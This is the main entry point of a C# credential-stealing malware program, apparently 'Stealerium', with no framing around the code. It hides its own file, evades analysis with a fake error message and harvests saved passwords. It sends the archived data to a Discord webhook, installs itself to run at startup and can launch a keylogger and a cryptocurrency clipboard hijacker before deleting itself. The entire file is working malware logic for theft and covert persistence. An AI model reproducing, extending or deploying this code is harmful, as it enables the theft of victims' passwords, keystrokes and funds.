using System;
using System.IO;
using System.Net;
using System.Threading;
using Stealerium.Helpers;
using Stealerium.Modules;
using Stealerium.Modules.Implant;
using Stealerium.Target;

namespace Stealerium;

internal class Program
{
	[STAThread]
	private static void Main()
	{
		Thread thread = null;
		Thread thread2 = null;
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		ServicePointManager.DefaultConnectionLimit = 9999;
		MutexControl.Check();
		if (!Startup.IsFromStartup())
		{
			Startup.HideFile();
		}
		if (Config.Webhook.Contains("---"))
		{
			SelfDestruct.Melt();
		}
		if (Config.StartDelay == "1")
		{
			StartDelay.Run();
		}
		if (AntiAnalysis.Run())
		{
			AntiAnalysis.FakeErrorMessage();
		}
		Directory.SetCurrentDirectory(Paths.InitWorkDir());
		Config.Init();
		if (!DiscordWebHook.WebhookIsValid())
		{
			SelfDestruct.Melt();
		}
		DiscordWebHook.SendReport(Filemanager.CreateArchive(Passwords.Save()));
		if (Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices || Counter.PornServices) && !Startup.IsInstalled() && !Startup.IsFromStartup())
		{
			Startup.Install();
		}
		if (Config.KeyloggerModule == "1" && (Counter.BankingServices || Counter.Telegram) && Config.Autorun == "1")
		{
			Logging.Log("Starting keylogger modules...");
			thread = WindowManager.MainThread;
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
		}
		if (Config.ClipperModule == "1" && Counter.CryptoServices && Config.Autorun == "1")
		{
			Logging.Log("Starting clipper modules...");
			thread2 = ClipboardManager.MainThread;
			thread2.SetApartmentState(ApartmentState.STA);
			thread2.Start();
		}
		if (thread != null && thread.IsAlive)
		{
			thread.Join();
		}
		if (thread != null && thread2 != null && thread2.IsAlive)
		{
			thread2.Join();
		}
		if (!Startup.IsFromStartup())
		{
			SelfDestruct.Melt();
		}
	}
}
